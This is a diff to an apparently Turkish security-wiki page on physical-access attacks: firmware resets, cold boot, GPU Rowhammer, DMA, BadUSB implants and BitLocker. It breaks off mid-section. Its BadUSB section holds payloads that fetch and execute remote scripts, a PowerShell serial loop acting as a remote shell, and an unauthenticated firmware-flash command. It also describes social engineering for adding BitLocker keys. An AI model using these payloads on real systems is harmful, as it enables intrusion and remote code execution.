@@ -4,88 +4,90 @@
 
 ## BIOS Parola Kurtarma ve Sistem Güvenliği
 
-**BIOS'u sıfırlama** birkaç şekilde gerçekleştirilebilir. Çoğu anakartta, yaklaşık **30 dakika** çıkarıldığında BIOS ayarlarını ve parolayı sıfırlayan bir **pil** bulunur. Alternatif olarak, belirli pinleri birbirine bağlayarak bu ayarları sıfırlamak için **anakart üzerindeki bir jumper** ayarlanabilir.
+Eski PC firmware ayarları, CMOS pilinin çıkarılması veya belgelenmiş bir clear-CMOS jumper'ının kullanılmasıyla sıfırlanabilir. Gerekli güç kesme süresi anakarta özeldir ve modern UEFI parolaları veya anahtarları, uçucu olmayan flash bellekte, bir embedded controller'da ya da bir güvenlik cihazında tutulabilir; bu nedenle pilin çıkarılmasından sonra da kalabilir. Pinleri kısa devre yapmadan önce anakart/servis kılavuzuna başvurun; bu prosedür TPM ölçümlerini geçersiz kılabilir ve disk şifreleme kurtarma sürecini tetikleyebilir.
 
-Donanım ayarlamalarının mümkün veya pratik olmadığı durumlarda **yazılım araçları** bir çözüm sunar. **Kali Linux** gibi dağıtımlar içeren bir **Live CD/USB** üzerinden sistem çalıştırmak, BIOS parola kurtarmaya yardımcı olabilecek **_killCmos_** ve **_CmosPWD_** gibi araçlara erişim sağlar.
+Eski x86 sistemlerde **killCMOS** ve **CmosPwd** gibi araçlar, boot edilebilir bir ortamdan CMOS ile desteklenen ayarları inceleyebilir veya değiştirebilir. CmosPwd, belgelenmiş eski BIOS aileleri kümesindeki parola formatlarını tanır ve CMOS durumunu yedekleyebilir, geri yükleyebilir veya silebilir/sonlandırabilir; yayımlanmış derlemeleri eski DOS/Windows, Linux, FreeBSD ve NetBSD ortamlarını hedefler.<sup>[[18]](#references)</sup> Bu araçlar genel amaçlı UEFI parola kaldırıcıları değildir ve yeterli donanım/firmware erişimi gerektirir.
 
-BIOS parolası bilinmediğinde, parolanın **üç kez** yanlış girilmesi genellikle bir hata koduyla sonuçlanır. Bu kod, kullanılabilir bir parola elde etmek için [https://bios-pw.org](https://bios-pw.org) gibi web sitelerinde kullanılabilir.
+Bazı laptop firmware'leri, birkaç başarısız parola denemesinden sonra üreticiye özgü bir challenge code görüntüler. [bios-pw.org](https://bios-pw.org) gibi veritabanları bazı modeller için eski üretici kurtarma parolalarını türetebilir; ancak birçok sistem, türetilebilir bir challenge olmadan lockout uygular. Oluşturulan herhangi bir parolayı modele özgü kabul edin ve kalıcı deneme sayaçlarını tüketmekten kaçının.
 
 ### UEFI Güvenliği
 
-Geleneksel BIOS yerine **UEFI** kullanan modern sistemlerde, **Secure Boot** özelliğini devre dışı bırakmak da dahil olmak üzere UEFI ayarlarını analiz etmek ve değiştirmek için **chipsec** aracı kullanılabilir. Bu işlem aşağıdaki komutla gerçekleştirilebilir:
+Modern **UEFI** sistemlerde CHIPSEC, Secure Boot değişkeni korumalarını denetleyebilir. Aşağıdaki değişiklik yapmayan kontrolle başlayın; isteğe bağlı `-a modify` modu, değişkenleri kasıtlı olarak bozmaya çalışır ve yalnızca kurtarılabilir bir lab sistemi üzerinde kullanılmalıdır. CHIPSEC'in kendisi, ayrıcalıklı driver'ının ve düşük seviyeli donanım erişiminin production endpoint'leri için uygun olmadığı konusunda uyarır.<sup>[[11]](#references)</sup>
 ```bash
-python chipsec_main.py -module exploits.secure.boot.pk
+chipsec_main -m common.secureboot.variables
+# Destructive validation on a recoverable test system only:
+chipsec_main -m common.secureboot.variables -a modify
 ```
 ---
 
-## RAM Analysis and Cold Boot Attacks
+## RAM Analizi ve Cold Boot Saldırıları
 
-RAM, güç kesildikten sonra verileri kısa bir süre, genellikle **1 ila 2 dakika** boyunca saklar. Bu kalıcılık, sıvı nitrojen gibi soğuk maddeler uygulanarak **10 dakikaya** kadar uzatılabilir. Bu uzatılmış süre içinde, analiz için **dd.exe** ve **volatility** gibi araçlar kullanılarak bir **memory dump** oluşturulabilir.
+DRAM, yenileme durduğunda her biti anında kaybetmez. Bozulma hızı, modül teknolojisine ve sıcaklığa göre önemli ölçüde değişir; soğutma, kullanılabilir verilerin soğutulmamış bir güç döngüsünden çok daha uzun süre korunmasını sağlayabilir. Bir cold-boot saldırısı, küçük bir acquisition ortamına hızlıca yeniden başlatır veya soğutulmuş bir modülü aktarır, ham belleği yakalar ve bit bozulmasına rağmen kriptografik anahtarları yeniden oluşturur. Bir disk-copy utility otomatik olarak physical-memory imager değildir ve Volatility, acquisition işlemini gerçekleştirmek yerine capture edilen veriyi analiz eder; platforma uygun, doğrulanmış bir acquisition tool kullanın.<sup>[[12]](#references)</sup>
 
 ---
 
-## GPU Rowhammer Against Page Tables
+## Page Table'lara Karşı GPU Rowhammer
 
-Modern GPU Rowhammer saldırıları, sıradan buffer'lar yerine **GPU virtual-memory metadata**'sını hedeflediğinde çok daha kullanışlı hale gelir. **GDDR6 NVIDIA Ampere GPUs** üzerinde yapılan son çalışmalar, ayrıcalıksız CUDA code çalıştıran bir saldırganın GPU'ya özgü hammering pattern'leri oluşturabildiğini, paging structure'larını güvenlik açığı bulunan satırlara yerleştirmek için **memory massaging** kullanabildiğini ve ardından **last-level page table** veya bir ara **page directory** içindeki bitleri değiştirebildiğini göstermektedir. Tek bir translation entry bozulduğunda saldırgan, **arbitrary GPU memory read/write** yeteneği elde edebilir ve ardından host compromise aşamasına geçebilir.<sup>[[1]](#references)[[2]](#references)</sup>
+Modern GPU Rowhammer saldırıları, sıradan buffer'lar yerine **GPU virtual-memory metadata**'sını hedeflediğinde çok daha kullanışlı hâle gelir. **GDDR6 NVIDIA Ampere GPU**'lar üzerine yapılan güncel çalışmalar, unprivileged CUDA code çalıştıran bir saldırganın GPU'ya özgü hammering pattern'leri oluşturabildiğini, paging structure'ları güvenlik açığı bulunan satırlara yerleştirmek için **memory massaging** kullanabildiğini ve ardından **last-level page table** veya bir intermediate **page directory** içindeki bitleri değiştirebildiğini gösteriyor. Tek bir translation entry bozulduğunda saldırgan **arbitrary GPU memory read/write** yeteneğini elde edebilir ve ardından host compromise'a pivot edebilir.<sup>[[1]](#references)[[2]](#references)</sup>
 
 ### Exploitation Pattern
 
-1. GDDR6'da **hammerable rows**'ları profilleyin ve in-DRAM mitigations'ı aşan, refresh-aware / non-uniform hammering pattern'leri oluşturun.
-2. Driver'ın page-translation structures'ı varsayılan korumalı pool'da tutmak yerine hammerable physical locations'a yerleştirmesini sağlayacak şekilde **GPU allocations** üzerinde **memory massage** uygulayın. Uygulamada bu, low-memory page-table region'ını tüketmeyi ve kontrollü stride'larla büyük sparse UVM mappings yaymayı içerebilir.
-3. Bir page-table / page-directory entry içindeki **PFN** veya aperture-related bits gibi **translation metadata**'larını değiştirin; böylece saldırganın kontrolündeki virtual page, page-table pages'lerine, arbitrary GPU memory'ye veya host-visible system mappings'e çözümlenir.
-4. Forged mapping'i yeniden kullanarak ek translation entries'lerini yeniden yazın ve GPU contexts genelinde **arbitrary GPU memory read/write** seviyesine yükselin.
+1. GDDR6'da **hammerable row**'ları profilleyin ve DRAM içi mitigations'ı aşan, refresh-aware / non-uniform hammering pattern'leri oluşturun.
+2. Driver'ın page-translation structure'larını varsayılan protected pool'da tutmak yerine hammerable physical location'lara yerleştirmesi için **GPU allocation**'larını massage edin. Uygulamada bu, low-memory page-table region'ını tüketmeyi ve kontrollü stride'larla büyük, sparse UVM mapping'leri spray etmeyi içerebilir.
+3. Saldırganın kontrolündeki virtual page'in page-table page'lerine, arbitrary GPU memory'ye veya host-visible system mapping'lerine çözülmesini sağlamak için page-table / page-directory entry içindeki **PFN** veya aperture ile ilgili bitler gibi **translation metadata**'ları değiştirin.
+4. Forged mapping'i yeniden kullanarak ek translation entry'lerini yeniden yazın ve GPU context'leri arasında **arbitrary GPU memory read/write** yeteneğine yükselin.
 
-### Host Pivot and Mitigations
+### Host Pivot ve Mitigations
 
-- **IOMMU disabled** olduğunda forged system-aperture mappings, GPU'ya arbitrary **host physical memory** erişimi sağlayabilir ve GPU primitive'ini full host compromise'a dönüştürebilir.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
-- **GDDRHammer**, last-level page-table entries'lerini hedeflerken **GeForge**, bir page-directory level'ını bozmanın daha kolay olabileceğini gösterir; çünkü tek bir bit flip daha büyük bir translation subtree'ını yeniden hedefleyebilir. Yalnızca tek bir paging layer'ını security-critical kabul etmeyin.<sup>[[1]](#references)[[2]](#references)</sup>
-- **IOMMU** önemini korur; çünkü GDDRHammer/GeForge tarafından kullanılan doğrudan arbitrary-host-memory yolunu engeller, ancak **complete mitigation** değildir. **GPUBreach**, saldırganın GPU-writable, driver-owned CPU buffers'ı bozduğu ve ardından NVIDIA driver memory-safety bugs'larını tetikleyerek IOMMU enabled olsa bile kernel write primitive ve **root shell** elde ettiği ikinci aşama bir pivot gösterir.<sup>[[3]](#references)</sup>
-- Desteklenen workstation/server GPUs üzerinde **system-level ECC**, pratik bir hardening adımıdır. ECC bulunmayan consumer GPUs daha zayıf bir defense surface sunar.<sup>[[4]](#references)</sup>
-- Bu saldırılar yalnızca teorik değildir: **GeForge**, RTX 3060 üzerinde **1,171**, RTX A6000 üzerinde ise **202** bit flip bildirmiştir; bu sayılar çalışan bir host-privilege-escalation chain oluşturmak için yeterli olmuştur.<sup>[[2]](#references)[[9]](#references)</sup>
-
----
-
-## Direct Memory Access (DMA) Attacks
-
-**INCEPTION**, **FireWire** ve **Thunderbolt** gibi interface'lerle uyumlu, DMA üzerinden **physical memory manipulation** için tasarlanmış bir tooldur. Herhangi bir password kabul edecek şekilde memory'yi patch'leyerek login procedures'ın bypass edilmesini sağlar. Ancak **Windows 10** systems karşısında etkisizdir.
+- **IOMMU disabled** olduğunda forged system-aperture mapping'leri arbitrary **host physical memory**'yi GPU'ya açığa çıkarabilir ve GPU primitive'ini full host compromise'a dönüştürebilir.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
+- **GDDRHammer**, last-level page-table entry'lerini hedeflerken **GeForge**, bir page-directory level'ını bozmanın daha kolay olabileceğini gösterir; çünkü tek bir bit flip daha büyük bir translation subtree'yi yeniden hedefleyebilir. Yalnızca tek bir paging layer'ını security-critical kabul etmeyin.<sup>[[1]](#references)[[2]](#references)</sup>
+- **IOMMU**, GDDRHammer/GeForge tarafından kullanılan doğrudan arbitrary-host-memory yolunu engellediği için hâlâ önemlidir; ancak **complete mitigation** değildir. **GPUBreach**, saldırganın GPU-writable, driver-owned CPU buffer'larını bozduğu ve ardından NVIDIA driver memory-safety bug'larını tetikleyerek kernel write primitive ve **root shell** elde ettiği ikinci aşama bir pivot gösterir; bu, IOMMU enabled durumdayken bile mümkündür.<sup>[[3]](#references)</sup>
+- Desteklenen workstation/server GPU'larında **system-level ECC** pratik bir hardening adımıdır. ECC bulunmayan consumer GPU'lar daha zayıf bir defense surface sunar.<sup>[[4]](#references)</sup>
+- Bu saldırılar tamamen teorik değildir: **GeForge**, bir RTX 3060 üzerinde **1,171**, bir RTX A6000 üzerinde ise **202** bit flip bildirmiştir; bu sayılar çalışan bir host-privilege-escalation chain oluşturmak için yeterli olmuştur.<sup>[[2]](#references)[[9]](#references)</sup>
 
 ---
 
-## Live CD/USB for System Access
+## Direct Memory Access (DMA) Saldırıları
 
-**_sethc.exe_** veya **_Utilman.exe_** gibi system binaries'leri **_cmd.exe_** kopyasıyla değiştirmek, system privileges ile bir command prompt sağlayabilir. **chntpw** gibi tools, bir Windows installation'ın **SAM** file'ını düzenlemek ve password changes yapmak için kullanılabilir.
-
-**Kon-Boot**, Windows kernel veya UEFI'yi geçici olarak modify ederek password bilinmeden Windows systems'a login olmayı kolaylaştıran bir tool'dur. Daha fazla bilgiye [https://www.raymond.cc](https://www.raymond.cc/blog/login-to-windows-administrator-and-linux-root-account-without-knowing-or-changing-current-password/) adresinden ulaşılabilir.<sup>[[10]](#references)</sup>
+**Inception**, FireWire ve ilk Thunderbolt yapılandırmaları gibi interface'ler üzerinden **DMA-based memory acquisition and patching** işlemini ve historical login-bypass signature'larını gösterir. Bu yöntem yalnızca “Windows 10'a karşı etkisiz” değildir: exploitability; interface'e, target build'e, IOMMU policy'ye, lock state'e ve Windows Kernel DMA Protection'ın desteklenip etkinleştirilmiş olup olmamasına bağlıdır. Windows 10 version 1803 ve sonraki sürümler, uyumlu platformlarda Kernel DMA Protection'ı kullanıma sunarak attack surface'i önemli ölçüde değiştirmiştir.<sup>[[13]](#references)[[14]](#references)</sup>
 
 ---
 
-## Handling Windows Security Features
+## System Access için Live CD/USB
 
-### Boot and Recovery Shortcuts
+Şifrelenmemiş veya zaten unlock edilmiş bir Windows volume üzerinde offline environment, **sethc.exe** veya **Utilman.exe** gibi accessibility binary'lerini **cmd.exe** ile değiştirebilir; ilgili logon-screen shortcut çalıştırıldığında SYSTEM command prompt elde edilir. **chntpw** gibi tools, local SAM account data'yı düzenleyebilir. Bu yöntemler locked BitLocker volume'u bypass etmez ve DPAPI/EFS tarafından korunan credential'lara zarar verebilir; forensic copy'leri ve backup'ları koruyun.
 
-- **Supr**: BIOS settings'e erişir.
-- **F8**: Recovery mode'a girer.
-- Windows banner'ından sonra **Shift** tuşuna basmak autologon'u bypass edebilir.
+**Kon-Boot**, desteklenen Windows/macOS yapılandırmaları için commercial boot-time authentication-bypass tool'dur. Compatibility; OS, firmware mode, Secure Boot ve disk-encryption setup'a bağlıdır; BitLocker-locked volume'un şifresini çözmez.<sup>[[10]](#references)</sup>
+
+---
+
+## Windows Security Features ile Çalışma
+
+### Boot ve Recovery Shortcut'ları
+
+- **Delete/Supr**, F2, F10 veya başka bir vendor key firmware setup'ı açabilir.
+- **F8**, yalnızca bu yolun etkin kalmaya devam ettiği yapılandırmalarda legacy Windows advanced boot options'a girer; güncel recovery entry yöntemi değişiklik gösterir.
+- **Shift** tuşunu basılı tutmak bazı yapılandırmalarda Windows automatic logon'u engelleyebilir; ancak policy/registry settings bu davranışı devre dışı bırakabilir.<sup>[[17]](#references)</sup>
 
 ### BAD USB Devices
 
-**Rubber Ducky** ve **Teensyduino** gibi devices, bir target computer'a bağlandıklarında önceden tanımlanmış payload'ları çalıştırabilen **bad USB** devices oluşturmak için platform görevi görür.
+**USB Rubber Ducky** ve Teensy board'ları gibi devices, trusted HID keyboard olarak enumerate olabilir ve predefined keystroke'lar inject edebilir. Payload başlangıçta logged-on session'ın privilege'larına ve desktop access'ine sahiptir; UAC prompt'ları, screen locking, keyboard layout, timing ve endpoint USB policy yine de payload'ı sınırlar.<sup>[[15]](#references)</sup>
 
 ### Volume Shadow Copy
 
-Administrator privileges, PowerShell üzerinden **SAM** file'ı da dahil olmak üzere sensitive files'ın copies'lerinin oluşturulmasına izin verir.
+Administrator veya backup privilege'ları, locked file'ların (örneğin **SAM** ve **SYSTEM**) acquire edilebilmesi için shadow copy oluşturabilir veya registry hive'larını kaydedebilir. Bu, post-compromise collection technique'tir; privilege bypass değildir ve `diskshadow`/VSS ile registry-hive export event'leriyle ilişkilendirilmelidir.
 
 ## BadUSB / HID Implant Techniques
 
 ### Wi-Fi managed cable implants
 
-- **Evil Crow Cable Wind** gibi ESP32-S3 based implants, USB-A→USB-C veya USB-C↔USB-C cables içine gizlenir, yalnızca USB keyboard olarak enumerate edilir ve C2 stack'lerini Wi-Fi üzerinden sunar. Operator'ün tek yapması gereken cable'ı victim host'tan güçlendirmek, `Evil Crow Cable Wind` adlı ve password'ü `123456789` olan bir hotspot oluşturmak ve embedded HTTP interface'e ulaşmak için [http://cable-wind.local/](http://cable-wind.local/) (veya DHCP address'ini) açmaktır.<sup>[[8]](#references)</sup>
-- Browser UI; *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* ve *Config* tabs'lerini sunar. Stored payloads OS başına tag'lenir, keyboard layouts çalışma sırasında değiştirilir ve VID/PID strings bilinen peripherals'ları taklit edecek şekilde değiştirilebilir.
-- C2 cable'ın içinde bulunduğundan bir phone, host OS'a dokunmadan payloads'ları stage edebilir, execution'ı trigger edebilir ve Wi-Fi credentials'ı yönetebilir; bu, kısa dwell-time gerektiren physical intrusions için idealdir.
+- **Evil Crow Cable Wind** gibi ESP32-S3 tabanlı implants, USB-A→USB-C veya USB-C↔USB-C cable'ların içine gizlenir, yalnızca USB keyboard olarak enumerate olur ve C2 stack'ini Wi-Fi üzerinden sunar. Operator'ün yapması gereken tek şey cable'a victim host üzerinden güç vermek, `Evil Crow Cable Wind` adlı ve `123456789` parolalı bir hotspot oluşturmak ve embedded HTTP interface'e ulaşmak için [http://cable-wind.local/](http://cable-wind.local/) adresine (veya DHCP address'ine) gitmektir.<sup>[[8]](#references)</sup>
+- Browser UI; *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* ve *Config* sekmelerini sağlar. Stored payload'lar OS başına tag'lenir, keyboard layout'ları anında değiştirilir ve VID/PID string'leri bilinen peripheral'ları taklit edecek şekilde değiştirilebilir.
+- C2 cable'ın içinde bulunduğundan phone, payload'ları stage edebilir, execution'ı trigger edebilir ve Wi-Fi credential'larını organization's network'ünü kullanmadan yönetebilir; bu, kısa dwell-time gerektiren physical intrusion'lar için kullanışlıdır.
 
 ### OS-aware AutoExec payloads
 
-- AutoExec rules, USB enumeration'dan hemen sonra çalıştırılmak üzere bir veya daha fazla payload'ı bağlar. Implant, lightweight OS fingerprinting gerçekleştirir ve eşleşen script'i seçer.
+- AutoExec rule'ları, USB enumeration'dan hemen sonra çalıştırılmak üzere bir veya daha fazla payload'ı bağlar. Implant, lightweight OS fingerprinting gerçekleştirir ve eşleşen script'i seçer.
 - Example workflow:
 - *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
 - *macOS/Linux:* `COMMAND SPACE` (Spotlight) veya `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
@@ -93,108 +95,115 @@ Administrator privileges, PowerShell üzerinden **SAM** file'ı da dahil olmak �
 
 ### HID-bootstrapped remote shell over Wi-Fi TCP
 
-1. **Keystroke bootstrap:** Stored payload bir console açar ve new USB serial device'a gelen her şeyi çalıştıran bir loop'u paste eder. Minimal bir Windows variant'ı şöyledir:
+1. **Keystroke bootstrap:** Stored payload bir console açar ve yeni USB serial device'a gelen her şeyi çalıştıran bir loop'u paste eder. Minimal bir Windows variant'ı şöyledir:
 ```powershell
 $port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
 $port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
 ```
-2. **Cable bridge:** Implant, USB CDC kanalını açık tutarken ESP32-S3'ü operatöre geri bağlanan bir TCP client (Python script'i, Android APK'si veya masaüstü executable'ı) başlatır. TCP oturumuna yazılan tüm byte'lar yukarıdaki serial döngüsüne iletilir ve air-gapped host'larda bile uzaktan command execution sağlanır. Çıktı sınırlıdır; bu nedenle operatörler genellikle blind commands (account creation, ek tooling'i staging etme vb.) çalıştırır.
+2. **Cable bridge:** Implant, USB CDC kanalını açık tutarken ESP32-S3, operatöre geri bağlanan bir TCP client (Python script, Android APK veya masaüstü executable) başlatır. TCP oturumuna yazılan tüm byte'lar yukarıdaki serial kanalına iletilir; böylece air-gapped host'larda bile remote command execution elde edilir. Çıktı sınırlıdır, bu nedenle operatörler genellikle blind command'ler (account creation, ek tooling hazırlama vb.) çalıştırır.
 
 ### HTTP OTA update surface
 
-- Aynı web stack genellikle kimlik doğrulaması gerektirmeyen firmware updates sunar. Evil Crow Cable Wind, `/update` üzerinde dinler ve upload edilen binary ne olursa olsun onu flash'lar:
+- Belgelenen Evil Crow Cable Wind arayüzü, `/update` adresinde unauthenticated bir firmware-update endpoint'i sunar:<sup>[[8]](#references)</sup>
 ```bash
 curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
 ```
-- Saha operatörleri, kabloyu açmadan görev sırasında özellikleri hot-swap ile değiştirebilir (ör. flash USB Army Knife firmware'ını yükleyebilir); böylece implant hedef host'a hâlâ bağlıyken yeni yeteneklere geçiş yapabilir.
+- Field operators, engagement sırasında kabloyu açmadan özellikleri (ör. flash USB Army Knife firmware'i) hot-swap ile değiştirebilir; böylece implant hedef host'a hâlâ bağlıyken yeni yeteneklere geçiş yapabilir.
 
-## BitLocker Encryption'ı Bypass Etme
+## BitLocker Şifrelemesini Atlama
 
-**recovery password** bir memory dump dosyasında (**MEMORY.DMP**) bulunursa BitLocker encryption potansiyel olarak bypass edilebilir. Bu amaçla **Elcomsoft Forensic Disk Decryptor** veya **Passware Kit Forensic** gibi araçlar kullanılabilir.
-
----
-
-## Recovery Key Eklemek için Social Engineering
-
-Bir kullanıcıyı, sıfırlardan oluşan yeni bir recovery key ekleyen bir komutu çalıştırmaya ikna ederek social engineering taktikleriyle yeni bir BitLocker recovery key eklenebilir; bu da decryption sürecini basitleştirir.
+Canlı veya kısa süre önce çalıştırılmış bir sistemin yetkili adli edinimi, volume kilidi açılmış durumdayken bir BitLocker volume master key'i veya ilişkili anahtar materyali içerebilir. Elcomsoft Forensic Disk Decryptor ve Passware Kit Forensic gibi ticari araçlar, desteklenen bellek imajlarında, hibernation dosyalarında veya crash dump'larında arama yapabilir; ancak başarı garanti değildir. BitLocker etkinleştirildiğinde modern Windows, crash dump'larını da şifreler ve kayıtlı 48 haneli recovery password, bellekteki volume key'den farklı bir artefact'tır.<sup>[[12]](#references)[[16]](#references)</sup>
 
 ---
 
-## BIOS'u Factory-Reset Etmek için Chassis Intrusion / Maintenance Switch'lerini Exploit Etme
+## Recovery Key Eklemek İçin Social Engineering
 
-Birçok modern laptop ve small-form-factor desktop, Embedded Controller (EC) ile BIOS/UEFI firmware tarafından izlenen bir **chassis-intrusion switch** içerir. Switch'in temel amacı cihaz açıldığında bir uyarı oluşturmak olsa da vendor'lar bazen switch belirli bir düzende değiştirildiğinde tetiklenen **undocumented recovery shortcut** uygular.<sup>[[5]](#references)[[6]](#references)</sup>
+Bir saldırgan, bir yöneticiyi BitLocker yönetim komutlarını çalıştırmaya ikna ederek bir recovery-password, external-key veya başka bir protector ekleyebilir ve ardından bunu ele geçirebilir. Bir recovery password, sıfırlardan oluşan rastgele bir dize olamaz: BitLocker sayısal recovery password'ları doğrulanmış 48 haneli bir biçime sahiptir. İlgili yetkili yönetim sözdizimi `manage-bde -protectors -add C: -recoverypassword` şeklindedir; ortaya çıkan protector'ları `manage-bde -protectors -get C:` ile listeleyin. Protector eklemelerini izleyin ve yeni recovery materyalinin yalnızca onaylanmış konumlara escrow edilmesini sağlayın.<sup>[[16]](#references)</sup>
+
+---
+
+## BIOS'u Factory-Reset Etmek İçin Chassis Intrusion / Maintenance Switch'lerini Exploit Etme
+
+Birçok modern laptop ve small-form-factor desktop, Embedded Controller (EC) ile BIOS/UEFI firmware tarafından izlenen bir **chassis-intrusion switch** içerir. Switch'in temel amacı bir cihaz açıldığında uyarı vermek olsa da üreticiler bazen switch belirli bir düzende değiştirildiğinde tetiklenen **belgelenmemiş bir recovery shortcut** uygular.<sup>[[5]](#references)[[6]](#references)</sup>
 
 ### Attack Nasıl Çalışır
 
 1. Switch, EC üzerindeki bir **GPIO interrupt** hattına bağlanmıştır.
-2. EC üzerinde çalışan firmware, **timing ve press sayısını** takip eder.
-3. Hard-coded bir pattern tanındığında EC, sistem **NVRAM/CMOS içeriğini silen** bir *mainboard-reset* routine'i çağırır.
-4. Bir sonraki boot işleminde BIOS varsayılan değerleri yükler – **supervisor password, Secure Boot keys ve tüm özel configuration temizlenir**.
+2. EC üzerinde çalışan firmware, **basışların zamanlamasını ve sayısını** takip eder.
+3. Hard-coded bir pattern tanındığında EC, **system NVRAM/CMOS içeriğini silen** bir *mainboard-reset* routine'i çağırır.
+4. Bir sonraki boot işleminde etkilenen modeller resetlenmiş firmware durumunu yükler. Üreticiye ve revision'a bağlı olarak silinen durum; supervisor password'ünü, özel boot ayarlarını veya kayıtlı Secure Boot anahtarlarını içerebilir; TPM durumu ve disk-şifreleme etkileri ayrıca değerlendirilmelidir.
 
-> Secure Boot devre dışı bırakıldığında ve firmware password kaldırıldığında saldırgan, herhangi bir harici OS image'ını kolayca boot edebilir ve dahili drive'lara unrestricted access elde edebilir.
+> Bir firmware reset, external-boot seçeneklerini geri getirebilir; ancak storage'ın şifresini çözmez. BitLocker veya başka bir full-disk encryption sistemi, TPM/firmware değişikliklerinden sonra recovery moduna geçebilir ve recovery key olmadan internal drive'ı korumaya devam edebilir.<sup>[[16]](#references)</sup>
 
-### Real-World Example – Framework 13 Laptop
+### Gerçek Dünya Örneği – Framework 13 Laptop
 
-Framework 13 (11th/12th/13th-gen) için recovery shortcut şöyledir:
+Framework 13 (11th/12th/13th-gen) için recovery shortcut şu şekildedir:
 ```text
 Press intrusion switch  →  hold 2 s
 Release                 →  wait 2 s
 (repeat the press/release cycle 10× while the machine is powered)
 ```
-Onuncu döngüden sonra EC, BIOS'a bir sonraki yeniden başlatmada NVRAM'i silmesini bildiren bir flag ayarlar. Tüm prosedür yaklaşık 40 saniye sürer ve **bir tornavidadan başka hiçbir şey gerektirmez**.<sup>[[5]](#references)</sup>
+Onuncu döngünün ardından EC, BIOS'a bir sonraki yeniden başlatmada NVRAM'i silmesini bildiren bir flag ayarlar. Tüm prosedür yaklaşık 40 saniye sürer ve **bir tornavidadan başka hiçbir şey gerektirmez**.<sup>[[5]](#references)</sup>
 
 ### Genel Exploitation Prosedürü
 
-1. EC'nin çalışmasını sağlamak için hedefi açın veya askıya alma-devam ettirme işlemi gerçekleştirin.
-2. Intrusion/maintenance switch'e erişmek için alt kapağı çıkarın.
-3. Üreticiye özgü toggle pattern'i tekrarlayın (dokümantasyona, forumlara başvurun veya EC firmware'ini reverse-engineer edin).
-4. Yeniden monte edin ve yeniden başlatın – firmware korumaları devre dışı bırakılmış olmalıdır.
-5. Bir live USB (ör. Kali Linux) ile boot edin ve olağan post-exploitation işlemlerini gerçekleştirin (credential dumping, data exfiltration, kötü amaçlı EFI binary'leri yerleştirme vb.).
+1. EC'nin çalışmasını sağlamak için hedefi açın veya askıya alıp devam ettirin.
+2. İzinsiz giriş/bakım anahtarını açığa çıkarmak için alt kapağı çıkarın.
+3. Üreticiye özgü toggle pattern'i tekrarlayın (dokümantasyona ve forumlara başvurun veya EC firmware'ini reverse-engineer edin).
+4. Cihazı yeniden monte edip reboot edin, ardından hangi firmware ayarlarının ve kimlik bilgilerinin gerçekten değiştiğini inceleyin.
+5. Yetkiniz varsa ve harici boot kullanılabiliyorsa, kontrollü bir live image ile boot edin. Dahili bir volume meşru biçimde unlock edildikten sonra (veya hiç encrypted değilse), live environment kimlik bilgilerini ve verileri elde edebilir veya EFI System Partition'ı inceleyebilir. Bu partition'ı bir EFI implant kurmak için değiştirmek kalıcı ve son derece intrusive bir işlemdir; ayrıca Secure Boot, measured boot, firmware write protection ve endpoint monitoring tarafından sınırlandırılmaya devam eder. Encrypted storage, anahtarı veya recovery material'ı olmadan erişilemez durumdadır.
 
-### Tespit ve Azaltma
+### Detection & Mitigation
 
-* OS yönetim konsolundaki chassis-intrusion olaylarını loglayın ve bunları beklenmeyen BIOS reset'leriyle ilişkilendirin.
-* Açılmayı tespit etmek için vidalar/kapaklar üzerinde **tamper-evident seals** kullanın.
-* Cihazları **fiziksel olarak kontrollü alanlarda** tutun; fiziksel erişimin tam compromise anlamına geldiğini varsayın.
-* Kullanılabildiği durumlarda üreticinin “maintenance switch reset” özelliğini devre dışı bırakın veya NVRAM reset'leri için ek bir cryptographic authorisation gerektirin.
+* OS management console'da chassis-intrusion event'lerini loglayın ve bunları beklenmeyen BIOS reset'leriyle ilişkilendirin.
+* Açılmayı tespit etmek için vidalar/kapaklar üzerinde **tamper-evident seal'ler** kullanın.
+* Cihazları **fiziksel olarak kontrol edilen alanlarda** tutun; fiziksel erişimin full compromise anlamına geldiğini varsayın.
+* Kullanılabildiği durumlarda, üreticinin “maintenance switch reset” özelliğini devre dışı bırakın veya NVRAM reset'leri için ek bir cryptographic authorisation gerektirin.
 
 ---
 
-## No-Touch Exit Sensörlerine Karşı Gizli IR Injection
+## No-Touch Exit Sensor'larına Karşı Covert IR Injection
 
-### Sensör Özellikleri
-- Standart “wave-to-exit” sensörleri, bir near-IR LED emitter'ı, yalnızca doğru carrier'ı (≈30 kHz) birden fazla pulse (~4–10) gördükten sonra logic high bildiren TV kumandası tarzı bir receiver module ile eşleştirir.<sup>[[7]](#references)</sup>
+### Sensor Özellikleri
+- Commodity “wave-to-exit” sensor'ları, near-IR LED emitter'ı TV kumandası tarzı bir receiver module'üyle eşleştirir ve yalnızca doğru carrier'ın birden fazla pulse'unu (yaklaşık 4–10) gördükten sonra logic high bildirir (≈30 kHz).<sup>[[7]](#references)</sup>
 - Plastik bir shroud, emitter ve receiver'ın doğrudan birbirine bakmasını engeller; böylece controller, doğrulanmış herhangi bir carrier'ın yakındaki bir yansımadan geldiğini varsayar ve door strike'ı açan bir relay'i sürer.
-- Controller bir hedefin mevcut olduğuna inandığında outbound modulation envelope'u sıklıkla değiştirir, ancak receiver filtrelenmiş carrier ile eşleşen herhangi bir burst'ü kabul etmeye devam eder.
+- Controller bir target'ın mevcut olduğuna inandığında outbound modulation envelope'u genellikle değişir, ancak receiver filtrelenmiş carrier ile eşleşen herhangi bir burst'ü kabul etmeye devam eder.
 
 ### Attack Workflow
-1. **Emission profile'ı yakalayın** – internal IR LED'i süren hem detection öncesi hem de detection sonrası waveform'ları kaydetmek için controller pinlerine bir logic analyser bağlayın.
